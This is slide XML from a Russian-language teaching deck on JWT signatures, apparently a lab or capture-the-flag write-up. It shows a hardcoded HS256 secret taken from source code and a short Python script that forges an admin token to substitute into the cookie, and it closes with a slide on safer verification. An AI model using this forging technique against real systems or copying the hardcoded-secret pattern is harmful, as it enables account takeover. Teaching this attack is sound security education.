            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2190750" y="2828925"/>
            <a:ext cx="9315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A9B7C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0">
                <a:solidFill>
                  <a:srgbClr val="A9B7C6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" sz="1650" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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1yFW2Ymuae28B1eGkj0fQedYWJU55J-rDDXiT4wPyMQ</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="v7-text-74">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4AE0D3D9-290A-4788-AE1B-3426F8A52EA5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2025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Header</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="v7-text-75">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D762E4D8-1F7C-40F0-9675-9FF0F618A78D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4381500" y="36385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Payload</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="v7-text-76">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A3C7383C-8C7A-4824-BF6A-772A20FBD2CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8077200" y="36385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HMAC-подпись</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="v7-text-77">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4CAF4763-DFD1-4D83-80AB-15ECAE51ABD9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33337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"alg": </a:t>
            </a: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"HS256"</a:t>
            </a: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,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"typ": </a:t>
            </a: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"JWT"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7" name="v7-text-78">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E36953B0-0DCE-4261-98E3-8A3120835F5C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4381500" y="4029075"/>
            <a:ext cx="34290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"sub":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"17"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,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"name":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alex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,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"exp":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2000000000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8" name="v7-text-79">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2890CE16-1642-4448-A28F-2D0DBEF3DE96}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8077200" y="4114800"/>
            <a:ext cx="3429000" cy="1457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Целостность</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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header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и payload.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75" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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Содержимое</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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8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читаемо</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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29" name="v2-text-2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8ED0E988-468A-4876-A097-428D4CBF502C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3328861" y="1162050"/>
            <a:ext cx="4318111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endParaRPr kumimoji="0" sz="195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1460756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5C12C6B8-DDF1-4EA7-AEF9-842ABF0A4A9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JWT: вычисление HMAC-подписи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807DE8D-FBA0-45BF-843C-BA83F0D93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13" name="v7-box-81">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B7D887F7-FAEA-4764-879C-4A3235309526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7010400" cy="3429000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10161E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14" name="v7-text-82">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DC9B99E3-2667-4766-8BC2-8C7676B7DB9E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="895350" y="2247900"/>
            <a:ext cx="6591300" cy="3067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message = header64 +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'.'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+ payload64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mac =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HMAC_SHA256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secret, message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signature64 = base64url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mac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compare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expected_mac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,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received_mac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5" name="v7-text-83">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8A4CE18-3503-4B05-9653-547D8F829DBD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3409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Проверенные</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="195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варианты</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="1950" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="v7-text-84">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{79C92D8E-6F0F-4C3C-8459-349D100835E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="2762250"/>
            <a:ext cx="3409950" cy="2800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Исходный payload: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подпись верна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75" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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Изменён name: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подпись не проходит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75" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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Известен ключ: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можно пересчитать MAC</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17484891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47EA61B4-BE77-4B8E-BAD9-40C069C00DA3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Senior JWT Engineer: задание</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Рисунок 13" descr="Скриншот выполнения из writeup_for_web.pptx, объединённый с карточкой задания.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{600D2AC9-A8DD-46FB-85AF-490081542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266825" y="2476130"/>
            <a:ext cx="6000750" cy="2848715"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="v2-text-4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A742AB80-CEE6-43A4-BD72-0F62EA3C8DD2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="1857375"/>
            <a:ext cx="308610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21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Проверить</a:t>
            </a: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1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подпись</a:t>
            </a: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HS256 и </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="21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влияние</a:t>
            </a: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1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раскрытого</a:t>
            </a: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1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ключа</a:t>
            </a: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1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на</a:t>
            </a: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admin-</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="217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доступ</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="2175" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="v2-text-5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3F891DEA-0523-4D2E-8238-FF2EDB32C403}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="4343400"/>
            <a:ext cx="3086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Совместная практика</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="v2-text-6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3D0BFC37-C8DA-467D-993E-A79A9A3FFB76}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="5267325"/>
            <a:ext cx="3086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A9B7C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A9B7C6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas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Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>127.0.0.1:8082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6EE0927-A5E7-4BC7-BF16-5605BF9D9C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4193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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Senior JWT Engineer: шаг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F9C1B7-EF20-48AF-9312-609D57FD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B0F0C22-7D67-4070-94E0-07C2EDBD5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877" y="1431334"/>
            <a:ext cx="8655781" cy="4702800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic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68BDC8FF-1E0D-453B-9462-8F823B9DF8E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="768743" y="3916545"/>
            <a:ext cx="2059423" cy="1064103"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C970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AF3AD768-53B1-4F1F-B747-9F4BD39535B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2500439" y="3022108"/>
            <a:ext cx="4349469" cy="894437"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C970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90B773A-5026-4389-A561-03E50D9DFE14}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6862046" y="3820099"/>
            <a:ext cx="2449189" cy="606243"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C97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C9D2C5E-104A-40BD-8C97-168C67C6A5F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2857837" y="4959025"/>
            <a:ext cx="3429675" cy="345304"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C97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9603098-E8C6-4DEE-AAF1-8792256196CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="99548" y="2719022"/>
            <a:ext cx="2400891" cy="291215"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C97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v7-text-83">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E1456EA-5FD3-4E05-B825-C747522C58A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="156192" y="2692688"/>
            <a:ext cx="3284524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ru-RU" sz="17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Доступ только у админа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0D6301D-35EB-423F-9505-331CE631F659}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="87411" y="3608730"/>
            <a:ext cx="2059424" cy="291215"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C97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v7-text-83">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0FF9718E-C73A-4BA0-8BEC-CF651AE991C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="144054" y="3582396"/>
            <a:ext cx="3284524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ru-RU" sz="17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В </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ru-RU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куки</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ru-RU" sz="17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 находится </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US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jwt</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="ru-RU" sz="1700" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="DejaVu Sans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7053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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Senior JWT Engineer: шаг 2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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-9-8" descr="JWT, шаг 5. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A39EE131-24DC-EF1F-81AC-DA2B90CF8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974" y="1581150"/>
            <a:ext cx="6420053" cy="4514850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="v2-text-1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0B51AF0-693E-41A7-B9CD-F5C30BDC7092}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2227314" y="1125846"/>
            <a:ext cx="9278886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ru-RU" sz="2175" b="0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Декодируем из </a:t>
            </a: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base64 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ru-RU" sz="2175" b="0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и получаем содержимое токена</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="2175" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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392569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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Senior JWT Engineer: шаг 3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F9C1B7-EF20-48AF-9312-609D57FD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900" name="editable-code-34-900">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{41E43A33-A4C2-482F-A8C5-86017AF53D38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1688391" y="1581150"/>
            <a:ext cx="8815218" cy="451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import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jwt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13" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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secret = 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"omg_is_it_a_secret?"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13" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="9CDCFE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F44747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def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gen_jwt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username: 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str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-&gt; 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str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payload = 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    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"username"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 username,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}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token = jwt.encode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payload, secret, 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7BA7D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algorithm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=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"HS256"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return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token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13" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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F44747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def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decode_jwt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token: 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str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-&gt; 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dict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try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    payload = jwt.decode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token, secret, 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7BA7D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algorithms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=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[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"HS256"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]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    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return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payload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except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Exception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as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13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    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raise</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1613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e</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="v2-text-1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{69F9867F-A1B5-4DA3-BB8D-CA2A4401CDA1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1729654" y="1121800"/>
            <a:ext cx="9278886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ru-RU" sz="2175" b="0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В исходном коде находим секретный ключ для подписи</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="2175" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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9249501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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Senior JWT Engineer: шаг 4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F9C1B7-EF20-48AF-9312-609D57FD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5" name="v2-text-1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A18FAEA1-95F7-4316-81BD-157D6F183E08}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2227314" y="1128718"/>
            <a:ext cx="9278886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ru-RU" sz="2175" b="0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Создаём подпись с</a:t>
            </a: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username, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ru-RU" sz="2175" b="0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изменённым на </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" sz="2175" b="0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admin</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="2175" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="editable-code-35-3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E446861-2E49-4540-A5E0-ECEBEE01FC0B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2578418" y="1614488"/>
            <a:ext cx="7035165" cy="3257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>
              <a:defRPr sz="15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>
              <a:defRPr sz="15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>
              <a:defRPr sz="15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>
              <a:defRPr sz="15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>
              <a:defRPr sz="15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>
              <a:defRPr sz="15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>
              <a:defRPr sz="15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>
              <a:defRPr sz="15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>
              <a:defRPr sz="15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import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jwt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SECRET_KEY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=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omg_is_it_a_secret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?"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ALGORITHM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=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"HS256"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9CDCFE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9CDCFE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44747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def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create_jwt_token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data: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dict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-&gt;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str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return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jwt.encode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data,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SECRET_KEY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,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7BA7D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algorithm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=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ALGORITHM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FFD700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FFD700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payload =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"username"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"admin"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}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FFD700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token =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create_jwt_token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payload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print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Сгенерированный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JWT:"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print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token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A70E02-1853-334D-4CDD-ECC28D631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75"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2578651" y="4960014"/>
            <a:ext cx="7034698" cy="149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9088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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Senior JWT Engineer: шаг 5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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-15-8" descr="JWT, шаг 11. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DCAC4161-4229-5760-CC4A-3B26D9838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480" y="1581150"/>
            <a:ext cx="10051041" cy="4514850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="v2-text-1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E9BC9C1-1474-4172-9A92-E00382798052}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1104554" y="1154168"/>
            <a:ext cx="9278886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ru-RU" sz="2175" b="0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Подставляем </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ru-RU" sz="2175" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0" err="1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куки</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="2175" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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5525779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B3337-0273-AEB3-F84A-32F53FC4F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0EE6F650-12CC-812D-459E-D1546806F657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JWT: ошибки проверки и защита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62351CC-9F2A-6221-7462-72BDE9902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22CDF44-93A6-73AC-E296-6A3E3941FFC0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1046480" y="1383624"/>
            <a:ext cx="2888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</a:rPr>
              <a:t>Небезопасный код </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="editable-code-30-28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F900D6F1-0E63-41E3-9D52-EB6356272102}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6187440" y="3276600"/>
            <a:ext cx="5318760" cy="3181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import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jwt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import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os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88" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="4EC9B0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SECRET_KEY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= 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os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.getenv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"JWT_SECRET"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, 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"super_secure_random_key_here"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88" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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safe_payload = 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"user_id"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 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42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,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"role"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 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"student"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}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88" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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token = jwt.encode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safe_payload, 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SECRET_KEY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, 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7BA7D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algorithm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=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"HS256"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88" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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try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verified_data = jwt.decode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token, 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SECRET_KEY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, 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7BA7D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algorithms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=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[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"HS256"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]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print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"Успешная верификация:"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, verified_data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except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jwt.InvalidSignatureError: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print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"Внимание: Подпись токена недействительна!"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except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jwt.ExpiredSignatureError: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print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"Токен просрочен."</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1088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30" name="editable-code-30-30">
            <a:extLst>
